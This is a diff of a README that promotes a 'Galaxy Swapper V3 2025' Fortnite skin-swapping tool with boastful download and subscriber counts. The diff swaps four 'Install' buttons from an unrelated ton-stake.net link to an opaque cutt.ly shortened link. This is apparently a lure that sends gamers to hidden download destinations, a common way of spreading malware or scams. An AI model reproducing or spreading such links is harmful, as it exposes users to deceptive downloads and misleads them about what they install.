@@ -5,7 +5,9 @@
 
 **Description**: Transform your **Fortnite** experience with **Galaxy Swapper V3 2025**! This repository offers comprehensive tutorials, guides, and resources for the free version, enabling you to customize skins, emotes, pickaxes, and back blings in Battle Royale, Creative, and Save the World modes. With a user-friendly interface and support for the latest Fortnite updates, join our community with 120K+ downloads and 80K+ subscribers to personalize your gameplay in 2025!  [](https://www.galaxyswapperv3.com/)
 
-[![Install Galaxy Swapper V3](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://cutt.ly/BrNr4tQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -33,7 +35,9 @@ Personalize your Fortnite gameplay with these simple steps to set up Galaxy Swap
 6. **Troubleshooting** ❓  
    If download issues occur, disable your VPN, check your internet, or try browsers like Chrome, Firefox, or Edge. Ensure Fortnite is updated and not running during setup.  [](https://github.com/Galaxy-Swapper-V3/)
 
-[![Install Galaxy Swapper V3](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://cutt.ly/BrNr4tQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -46,7 +50,9 @@ Personalize your Fortnite gameplay with these simple steps to set up Galaxy Swap
 - 🌍 **Active Community**: Backed by 120K+ downloads and 80K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with Fortnite’s latest patches.  [](https://www.galaxyswapperv3.com/)
 
-[![Install Galaxy Swapper V3](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://cutt.ly/BrNr4tQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -64,9 +70,10 @@ Personalize your Fortnite gameplay with these simple steps to set up Galaxy Swap
 - 🛠 **Cosmetic Combos**: Download custom templates for unique skin combinations.  
 - 📚 **Skill Building**: Learn advanced customization from 80K+ subscribers.  
 
-[![Install Galaxy Swapper V3](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://cutt.ly/BrNr4tQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+ 
 
 ## 🏆 Benefits  
 
